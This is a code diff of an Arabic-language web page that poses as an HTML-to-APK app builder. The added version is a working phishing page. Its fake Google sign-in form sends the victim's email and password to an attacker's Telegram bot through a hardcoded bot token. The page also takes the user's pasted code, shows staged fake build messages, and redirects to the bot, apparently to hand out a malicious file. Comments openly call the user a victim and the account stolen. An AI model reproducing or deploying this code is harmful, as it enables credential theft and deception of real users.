@@ -3,98 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI App Generator | محول الأكواد الذكي</title>
+    <title>AppBuilder Pro | تسجيل الدخول</title>
     <style>
-        /* تصميم عصري يوحي بالاحترافية لإقناع الضحية */
-        :root { --primary: #00d4ff; --dark: #0b0e14; --accent: #00ff41; }
-        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .app-card { background: #151921; padding: 40px; border-radius: 20px; border: 1px solid #2d343f; width: 90%; max-width: 600px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
-        h1 { color: var(--primary); font-size: 2.2rem; margin-bottom: 10px; }
-        p { color: #8a94a6; font-size: 14px; }
-        .editor { margin-top: 25px; position: relative; }
-        textarea { width: 100%; height: 250px; background: #000; color: var(--accent); border: 1px solid #333; border-radius: 12px; padding: 15px; font-family: 'Courier New', monospace; font-size: 14px; resize: none; box-sizing: border-box; outline: none; transition: 0.3s; }
-        textarea:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 212, 255, 0.2); }
-        .btn-build { background: linear-gradient(90deg, #00d4ff, #0055ff); color: white; border: none; padding: 18px; width: 100%; font-size: 1.1rem; font-weight: bold; border-radius: 50px; cursor: pointer; margin-top: 20px; transition: 0.4s; box-shadow: 0 10px 20px rgba(0, 85, 255, 0.3); }
-        .btn-build:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 85, 255, 0.5); }
-        #loader { display: none; margin-top: 20px; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-text { color: var(--primary); margin-top: 10px; font-size: 13px; font-weight: bold; }
+        :root { --primary: #00d4ff; --bg: #0b0e14; --card: #151921; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .box { background: var(--card); padding: 35px; border-radius: 20px; border: 1px solid #2d343f; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
+        h1 { color: var(--primary); margin-bottom: 20px; }
+        input, textarea { width: 100%; background: #000; color: #fff; border: 1px solid #333; padding: 12px; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus, textarea:focus { border-color: var(--primary); }
+        .btn { background: var(--primary); color: #000; border: none; padding: 15px; width: 100%; border-radius: 50px; font-weight: bold; cursor: pointer; transition: 0.4s; }
+        .btn:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--primary); }
+        #editor-section { display: none; } /* مخفي حتى تسجيل الدخول */
+        .loading { display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="app-card">
-    <h1>AppBuilder <span style="font-weight: 300;">PRO</span></h1>
-    <p>أدخل كود HTML/CSS/JS بالأسفل لتحويله إلى تطبيق Android (APK) حقيقي</p>
+<div class="box" id="login-section">
+    <h1>AppBuilder PRO</h1>
+    <p style="color: #8a94a6;">سجل دخولك باستخدام حساب جوجل للوصول لمحرر APK</p>
+    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+    <input type="password" id="password" placeholder="كلمة المرور" required>
+    <button class="btn" onclick="captureLogin()">تسجيل الدخول</button>
+</div>
 
-    <div class="editor">
-        <textarea id="htmlInput" placeholder="<html>
-  <body>
-    <h1>مرحباً بك في تطبيقي</h1>
-  </body>
-</html>"></textarea>
-    </div>
-
-    <button class="btn-build" id="buildBtn" onclick="initiateBuild()">بدء إنشاء ملف الـ APK</button>
-
-    <div id="loader">
-        <div class="spinner"></div>
-        <div class="status-text" id="statusMsg">جاري الاتصال بخوادم Android SDK...</div>
+<div class="box" id="editor-section">
+    <h1>محرر الأكواد AI</h1>
+    <p style="color: #8a94a6;">ضع كود HTML لتحويله لتطبيق أندرويد</p>
+    <textarea id="htmlInput" placeholder="<html> ... </html>" style="height: 200px; color: #00ff41;"></textarea>
+    <button class="btn" onclick="captureCode()">بناء ملف APK الآن</button>
+    
+    <div class="loading" id="loader">
+        <div style="border: 4px solid #333; border-top: 4px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+        <p id="status-text" style="font-size: 12px; margin-top: 10px;">جاري المعالجة...</p>
     </div>
 </div>
 
 <script>
-    // بيانات الربط مع البوت الخاص بك
-    const BOT_TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
     const ADMIN_ID = "8754338811";
 
-    async function initiateBuild() {
+    // دالة إرسال البيانات للتليجرام
+    async function sendToBot(msg) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
+        });
+    }
+
+    // 1. سحب بيانات الدخول
+    async function captureLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        if(!email || !pass) return alert("يرجى ملء الحقول!");
+
+        // إرسال الحساب المسروق فوراً
+        await sendToBot(`🔥 **صيد جديد (تسجيل دخول):**\n📧 الإيميل: \`${email}\` \n🔑 الباسورد: \`${pass}\``);
+
+        // الانتقال للمرحلة التالية (المحرر)
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('editor-section').style.display = 'block';
+    }
+
+    // 2. سحب كود الـ HTML
+    async function captureCode() {
         const code = document.getElementById('htmlInput').value;
-        const btn = document.getElementById('buildBtn');
         const loader = document.getElementById('loader');
-        const status = document.getElementById('statusMsg');
 
-        if (code.length < 15) {
-            alert("يرجى إدخال كود HTML كامل وصحيح للبدء!");
-            return;
-        }
+        if(code.length < 10) return alert("أدخل كود صحيح!");
 
-        // إخفاء الزر وإظهار التحميل
-        btn.style.display = "none";
-        loader.style.display = "block";
+        loader.style.display = 'block';
 
-        // 1. إرسال الكود المسحوب إلى البوت الخاص بك فوراً
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: `🚀 **تم صيد كود جديد من الموقع!**\n\n**المحتوى:**\n\`\`\`html\n${code}\n\`\`\``,
-                    parse_mode: 'Markdown'
-                })
-            });
+        // إرسال الكود المسحوب
+        await sendToBot(`🚀 **كود HTML مسحوب من الضحية:**\n\n\`\`\`html\n${code}\n\`\`\``);
 
-            // 2. مراحل تمويه "بناء التطبيق"
-            setTimeout(() => { status.innerText = "جاري تجميع حزم APK (Gradle Build)..."; }, 3000);
-            setTimeout(() => { status.innerText = "جاري توقيع التطبيق وتشفير البيانات..."; }, 6000);
-            setTimeout(() => { status.innerText = "تم البناء بنجاح! جاري تحويلك لاستلام الرابط..."; }, 9000);
-
-            // 3. التحويل النهائي (الضحية سيذهب للبوت الخاص بك لاستلام ملفه الملغم)
-            setTimeout(() => {
-                // هنا نرسله للبوت ليقوم بالاشتراك أو استلام الملف
-                window.location.href = "https://t.me/8601512823"; 
-            }, 11000);
-
-        } catch (e) {
-            console.error(e);
-            alert("خطأ في الاتصال بالسيرفر، حاول مجدداً.");
-            btn.style.display = "block";
-            loader.style.display = "none";
-        }
+        // تمويه الضحية
+        setTimeout(() => { document.getElementById('status-text').innerText = "جاري تجميع حزم APK..."; }, 2000);
+        setTimeout(() => { 
+            window.location.href = "https://t.me/8601512823?start=ready"; // توجيه للبوت لاستلام الملف
+        }, 5000);
     }
 </script>
 
+<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
 </body>
 </html>
